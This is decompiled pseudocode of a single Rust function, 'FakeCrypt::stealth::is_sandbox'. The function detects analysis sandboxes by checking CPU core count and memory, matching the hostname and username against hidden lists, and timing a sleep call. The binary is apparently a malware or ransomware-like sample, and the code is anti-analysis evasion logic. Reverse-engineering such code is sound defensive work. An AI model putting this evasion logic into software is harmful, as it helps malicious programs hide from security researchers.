__int64 FakeCrypt::stealth::is_sandbox()
{
  unsigned __int64 v0; // rdx
  _BYTE *v1; // rbx
  int v2; // edx
  char **v4; // [rsp+0h] [rbp-218h] BYREF
  char **v5; // [rsp+8h] [rbp-210h]
  __int64 v6; // [rsp+10h] [rbp-208h]
  _BYTE v7[8]; // [rsp+18h] [rbp-200h] BYREF
  __int64 v8; // [rsp+20h] [rbp-1F8h]
  __int64 v9; // [rsp+28h] [rbp-1F0h]
  _BYTE v10[24]; // [rsp+30h] [rbp-1E8h] BYREF
  _BYTE v11[360]; // [rsp+48h] [rbp-1D0h] BYREF
  unsigned __int64 v12; // [rsp+1B0h] [rbp-68h]

  v1 = v11;
  sysinfo::common::System::new_all(v11);
  LOBYTE(v1) = 1;
  if ( (sysinfo::common::System::physical_core_count(v11) & 1) != 0 && v0 >= 2 && v12 >= 0x200000 )
  {
    hostname::get(&v4);
    core::result::Result<T,E>::unwrap_or_default(v7, &v4);
    alloc::string::String::from_utf8_lossy(&v4, v8, v9);
    alloc::str::<impl str>::to_lowercase(v10, v5, v6);
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v4);
    core::ptr::drop_in_place<std::ffi::os_str::OsString>(v7);
    v4 = &off_D91F0;
    v5 = &off_D9230;
    if ( !(unsigned __int8)<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::any(&v4, v10) )
    {
      whoami::api::username(&v4);
      alloc::str::<impl str>::to_lowercase(v7, v5, v6);
      core::ptr::drop_in_place<alloc::string::String>(&v4);
      v4 = &off_D9230;
      v5 = &off_D9260;
      if ( !(unsigned __int8)<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::any(&v4, v7) )
      {
        v4 = (char **)std::time::Instant::now();
        LODWORD(v5) = v2;
        std::thread::sleep(2LL, 0LL);
        if ( (unsigned __int64)std::time::Instant::elapsed(&v4) >= 2 )
        {
          core::ptr::drop_in_place<alloc::string::String>(v7);
          core::ptr::drop_in_place<alloc::string::String>(v10);
          LODWORD(v1) = 0;
          goto LABEL_9;
        }
      }
      core::ptr::drop_in_place<alloc::string::String>(v7);
    }
    LOBYTE(v1) = 1;
    core::ptr::drop_in_place<alloc::string::String>(v10);
  }
LABEL_9:
  core::ptr::drop_in_place<sysinfo::common::System>(v11);
  return (unsigned int)v1;
}